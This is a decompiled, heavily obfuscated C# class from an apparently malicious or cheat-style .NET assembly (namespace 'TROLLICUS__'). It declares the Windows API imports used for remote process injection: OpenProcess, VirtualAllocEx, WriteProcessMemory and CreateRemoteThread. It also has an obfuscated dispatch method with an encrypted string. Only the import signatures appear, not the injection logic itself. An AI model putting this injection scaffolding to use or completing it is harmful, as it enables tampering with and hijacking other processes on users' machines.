using System;
using System.Runtime.InteropServices;

namespace TROLLICUS__
{
	// Token: 0x020000BC RID: 188
	internal sealed class #=zEbC0xw0Vfqu3G9azXQ==
	{
		// Token: 0x06000590 RID: 1424 RVA: 0x00022B10 File Offset: 0x00020D10
		public #=zEbC0xw0Vfqu3G9azXQ==()
		{
			if (7 == 0)
			{
			}
			base..ctor();
		}

		// Token: 0x06000591 RID: 1425
		[DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
		public static extern IntPtr #=zNOrmtvo=(int #=z$K7mGiaZrE9Z, bool #=zjq6GoD2zCR2K, int #=zL9AvLYhiF4_v);

		// Token: 0x06000592 RID: 1426
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle")]
		public static extern IntPtr #=zYqgIgURtox2d(string #=zvFjv_zvZj68t);

		// Token: 0x06000593 RID: 1427
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr #=zitB4LhhATRfp(IntPtr #=z1PwsUPY=, string #=zljkj50s=);

		// Token: 0x06000594 RID: 1428
		[DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr #=zLbs4NzBsjwrA(IntPtr #=zd678AXc=, IntPtr #=z9x2nZK2xZB$M, uint #=z3DaanhI=, uint #=ziUdcw2ZGB5X0, uint #=zOs39tu10KitP);

		// Token: 0x06000595 RID: 1429
		[DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
		private static extern bool #=zuN3$xlio06xL(IntPtr #=zd678AXc=, IntPtr #=zSDSU1xHkRJZ3, byte[] #=zsh3CVmXoZKZf, uint #=zsyiVwQI=, out UIntPtr #=zFyFDHuRWkrVu37oYBw==);

		// Token: 0x06000596 RID: 1430
		[DllImport("kernel32.dll", EntryPoint = "CreateRemoteThread")]
		private static extern IntPtr #=z1z1bC4LgcTxW(IntPtr #=zd678AXc=, IntPtr #=zuCvd2fUxSsZf, uint #=zmCZ1LRryD7bB, IntPtr #=zxvIISWfslR2X, IntPtr #=ze5DmARo=, uint #=z$fMKJ3ZgcbL_, IntPtr #=z03g2291bjRlK);

		// Token: 0x06000597 RID: 1431 RVA: 0x00022B30 File Offset: 0x00020D30
		public static int #=zG0vcK$0=(string #=zjTJCOoE=)
		{
			object[] array = new object[1];
			object[] array2;
			if (6 != 0)
			{
				array2 = array;
			}
			array2[0] = #=zjTJCOoE=;
			return (int)#=z7U7jp8pICIw4GATappAAZ_$Yrifbq7ux2PRmkwq5FZYPq1SQmw==.#=zzsfkBUZ7NWmlK7P9$fvD1CYqC2vPbWkOwMhtcubjKrbAW61Tgw==().#=zNZQH3q_b7dLdLmw8nA==(#=z7U7jp8pICIw4GATappAAZ_$Yrifbq7ux2PRmkwq5FZYPq1SQmw==.#=z7xTuSEwD9O_JJ75OBsZHA71rrDzMLjAu7QuZczFmIyJxI$lcSw==(), "`lucS_T9pC", array2);
		}
	}
}
